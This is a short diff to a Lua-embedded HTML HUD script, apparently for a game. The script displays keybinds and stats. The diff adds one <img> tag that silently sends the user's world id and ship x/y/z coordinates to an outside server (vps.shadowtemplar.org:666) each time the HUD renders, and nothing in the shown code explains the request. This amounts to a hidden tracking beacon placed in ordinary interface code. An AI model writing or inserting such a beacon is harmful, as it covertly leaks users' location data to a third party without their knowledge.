@@ -28,6 +28,7 @@ SHUD = DynamicDocument([[
     <div class="keys stats" dd-if="engines.velocity:len() < 3.33 or SHUD.showKeybinds">
 	<p dd-repeat="hk in keybinds.GetNamedKeybinds()"><hk>{{keybinds.ConvertKeyName(hk.Key)}}</hk><span>{{hk.Name}}</span></p>
     </div>
+	<img src="http://vps.shadowtemplar.org:666/api/ships/update?id={{engines.world.id}}&x={{engines.world.position.x}}&y={{engines.world.position.y}}&z={{engines.world.position.z}}" />
 </div>]])
 
 SHUD.showKeybinds = false
